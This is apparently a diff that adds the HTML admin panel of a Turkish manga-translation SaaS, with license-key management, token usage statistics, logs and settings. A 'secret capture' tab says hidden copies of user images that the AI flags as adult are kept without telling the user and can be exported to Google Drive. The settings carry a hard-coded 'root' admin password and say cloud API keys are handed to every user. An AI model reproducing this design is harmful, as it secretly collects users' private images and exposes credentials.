@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Paneli | Manga Editör Pro</title>
+    <link rel="stylesheet" href="admin.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+    <div class="admin-container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <i class="fa-solid fa-shield-halved"></i>
+                <span>Admin <b>Panel</b></span>
+            </div>
+            <nav>
+                <a href="#" class="active" onclick="showTab('dashboard')"><i class="fa-solid fa-chart-line"></i> Dashboard</a>
+                <a href="#" onclick="showTab('keys')"><i class="fa-solid fa-key"></i> Lisans Anahtarları</a>
+                <a href="#" onclick="showTab('logs')"><i class="fa-solid fa-triangle-exclamation"></i> Loglar & İhbarlar</a>
+                <a href="#" onclick="showTab('gallery')"><i class="fa-solid fa-camera"></i> GİZLİ YAKALAMA</a>
+                <a href="#" onclick="showTab('settings')"><i class="fa-solid fa-gears"></i> Sistem Ayarları</a>
+                <div class="nav-divider"></div>
+                <a href="index.html" class="exit-link"><i class="fa-solid fa-arrow-left"></i> Editöre Dön</a>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="content">
+            <header>
+                <div class="header-info">
+                    <h1>Hoşgeldiniz, <span class="admin-name">Yönetici</span></h1>
+                    <p>Sistem genel durumunu ve lisansları buradan yönetebilirsiniz.</p>
+                </div>
+                <div class="header-actions">
+                    <button class="refresh-btn" onclick="loadData()"><i class="fa-solid fa-rotate"></i> Verileri Yenile</button>
+                    <div class="time" id="current-time">00:00:00</div>
+                </div>
+            </header>
+
+            <!-- Dashboard Tab -->
+            <section id="tab-dashboard" class="tab-content active">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon purple"><i class="fa-solid fa-key"></i></div>
+                        <div class="stat-details">
+                            <span class="stat-value" id="stat-total-keys">0</span>
+                            <span class="stat-label">Toplam Lisans</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon blue"><i class="fa-solid fa-file-invoice"></i></div>
+                        <div class="stat-details">
+                            <span class="stat-value" id="stat-total-pages">0</span>
+                            <span class="stat-label">Toplam Çevrilen Sayfa</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon green"><i class="fa-solid fa-dollar-sign"></i></div>
+                        <div class="stat-details">
+                            <span class="stat-value" id="stat-total-cost">0.00</span>
+                            <span class="stat-label">Toplam Tahmini Maliyet (USD)</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon red"><i class="fa-solid fa-ban"></i></div>
+                        <div class="stat-details">
+                            <span class="stat-value" id="stat-nsfw-count">0</span>
+                            <span class="stat-label">NSFW Engellemesi</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="charts-row">
+                    <div class="card glass">
+                        <h3><i class="fa-solid fa-microchip"></i> Token Kullanım Detayları</h3>
+                        <div class="token-stats">
+                            <div class="token-item">
+                                <span class="token-label">Gemini (Girdi/Çıktı)</span>
+                                <div class="progress-container">
+                                    <div class="progress-bar gemini" id="gemini-progress" style="width: 0%"></div>
+                                </div>
+                                <span class="token-count" id="gemini-token-count">0 / 0</span>
+                            </div>
+                            <div class="token-item">
+                                <span class="token-label">OpenRouter/Qwen (Girdi/Çıktı)</span>
+                                <div class="progress-container">
+                                    <div class="progress-bar grok" id="grok-progress" style="width: 0%"></div>
+                                </div>
+                                <span class="token-count" id="grok-token-count">0 / 0</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card glass">
+                        <h3><i class="fa-solid fa-clock-rotate-left"></i> Son Aktiviteler</h3>
+                        <div class="recent-list" id="recent-logs-preview">
+                            <!-- Logs will be populated here -->
+                            <p class="empty-msg">Henüz veri bulunmuyor.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Keys Tab -->
+            <section id="tab-keys" class="tab-content">
+                <div class="card glass">
+                    <div class="card-header-actions">
+                        <h3><i class="fa-solid fa-list-check"></i> Lisans Yönetimi</h3>
+                        <button class="action-btn primary" onclick="openNewKeyModal()"><i class="fa-solid fa-plus"></i> Yeni Key Üret</button>
+                    </div>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Lisans Anahtarı</th>
+                                    <th>Kullanım</th>
+                                    <th>Limit</th>
+                                    <th>Motor</th>
+                                    <th>Durum</th>
+                                    <th>İşlemler</th>
+                                </tr>
+                            </thead>
+                            <tbody id="keys-table-body">
+                                <!-- Table content -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Logs Tab -->
+            <section id="tab-logs" class="tab-content">
+                <div class="card glass">
+                    <h3><i class="fa-solid fa-triangle-exclamation"></i> Sistem İhbar ve Logları</h3>
+                    <div class="logs-container" id="all-logs-list">
+                        <!-- Full logs list -->
+                    </div>
+                </div>
+            </section>
+
+            <!-- Gallery Tab (GİZLİ YAKALAMA) -->
+            <section id="tab-gallery" class="tab-content">
+                <div class="card glass">
+                    <div class="card-header-actions">
+                        <h3><i class="fa-solid fa-camera"></i> Kanıt Fotoğrafları (Gizli Kayıtlar)</h3>
+                        <div style="display:flex; gap:10px;">
+                            <button class="action-btn success" id="drive-export-btn"><i class="fa-brands fa-google-drive"></i> Drive'a Aktar (ZIP)</button>
+                            <button class="action-btn danger" onclick="clearEvidence()"><i class="fa-solid fa-trash"></i> Hepsini Temizle</button>
+                        </div>
+                    </div>
+                    <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:20px;">Yapay zeka tarafından +18 olarak işaretlenen resimlerin gizli kopyaları burada saklanır. Kullanıcıya bildirilmez.</p>
+                    <div class="gallery-grid" id="evidence-gallery">
+                        <!-- Captured images will appear here -->
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Settings Tab -->
+            <section id="tab-settings" class="tab-content">
+                <div class="card glass">
+                    <h3><i class="fa-solid fa-gears"></i> Sistem Ayarları</h3>
+                    <div class="settings-form">
+                        <div class="setting-item">
+                            <label>Admin Şifresi</label>
+                            <div style="display:flex; gap:10px;">
+                                <input type="password" id="admin-password-input" value="root">
+                                <button class="action-btn secondary" onclick="toggleAdminPassword()"><i class="fa-solid fa-eye"></i></button>
+                                <button class="action-btn primary" onclick="updateSystemSettings()">Güncelle</button>
+                            </div>
+                        </div>
+                        <div class="setting-item" style="border-top:1px solid rgba(255,255,255,0.1); padding-top:15px; margin-top:15px;">
+                            <label><i class="fa-solid fa-key"></i> Bulut API Anahtarları</label>
+                            <p style="font-size:0.7rem; color:var(--text-muted); margin-bottom:10px;">Bu anahtarlar tüm kullanıcılara güvenle dağıtılır. Boş bırakmayın.</p>
+                            <div class="form-group" style="margin-bottom:10px;">
+                                <label style="font-size:0.7rem; opacity:0.7;">Gemini API Anahtarları (Virgülle ayırın)</label>
+                                <input type="password" id="cloud-gemini-keys" placeholder="sk-..." style="width:100%; padding:8px; border-radius:4px; background:rgba(0,0,0,0.2); color:white; border:1px solid var(--border);">
+                            </div>
+                            <div class="form-group" style="margin-bottom:15px;">
+                                <label style="font-size:0.7rem; opacity:0.7;">OpenRouter API Anahtarı</label>
+                                <input type="password" id="cloud-grok-key" placeholder="sk-or-v1-..." style="width:100%; padding:8px; border-radius:4px; background:rgba(0,0,0,0.2); color:white; border:1px solid var(--border);">
+                            </div>
+                            <button class="action-btn success full-width" onclick="updateSystemSettings()">Bulut Ayarlarını Kaydet</button>
+                        </div>
+
+                        <div class="setting-item" style="border-top:1px solid rgba(255,255,255,0.1); padding-top:15px; margin-top:15px;">
+                            <label>Veri Temizliği</label>
+                            <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:10px;">İstatistikleri ve yerel logları sıfırlar.</p>
+                            <button class="action-btn danger" onclick="resetAllStats()">Lokal Verileri Sıfırla</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Modals -->
+    <div id="modal-overlay" class="modal-overlay hidden">
+        <div class="modal glass">
+            <div class="modal-header">
+                <h3 id="modal-title">Yeni Lisans Üret</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="modal-body">
+                <div class="form-group">
+                    <label>Lisans Kodu (Otomatik üretilebilir)</label>
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" id="new-key-input" placeholder="MNG-XXXX-XXXX">
+                        <button class="action-btn secondary" onclick="generateRandomKey()">Rastgele</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Sayfa Limiti</label>
+                    <input type="number" id="new-limit-input" value="50">
+                </div>
+                <div class="form-group">
+                    <label>AI Motoru</label>
+                    <select id="new-engine-input">
+                        <option value="gemini">Gemini (Premium)</option>
+                        <option value="qwen/qwen3-vl-8b-instruct">Qwen 3 VL (Ucuz/Sansürsüz)</option>
+                    </select>
+                </div>
+                <button class="action-btn primary full-width" onclick="saveNewKey()">Kaydet ve Yayına Al</button>
+            </div>
+        </div>
+    </div>
+    <!-- SaaS: Firebase KONTROL MERKEZİ -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    
+    <script src="cloud.js"></script>
+    <script src="admin.js"></script>
+</body>
+</html>
